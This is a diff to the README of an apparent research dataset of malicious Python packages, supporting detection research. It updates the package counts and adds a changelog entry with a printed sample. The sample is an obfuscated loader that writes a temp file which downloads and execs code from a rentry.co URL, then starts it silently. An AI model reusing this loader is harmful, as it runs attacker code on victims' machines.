@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,120 versions of the source code of 5,374 malicious packages.
+This data set includes about 7,117 versions of the source code of 6,046 malicious packages.
 
 ## Dataset Format
 
@@ -651,6 +651,23 @@ class myclass(install):
 
 ### 26 Jun. 2024
 rock51 [1.0.0] <br>
+
+### 02 Jul. 2024
+
+add new 672 malicious packages, encompassing 997 versions.
+
+```python
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from os import system as _ssystem
+
+class http:
+ _ttmp = _ffile(delete=False)
+ _ttmp.write(b"""from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://rentry.co/277t2/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())""")
+ _ttmp.close()
+ try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+ except: pass
+```
 
 ## About the malicious packages detection
 
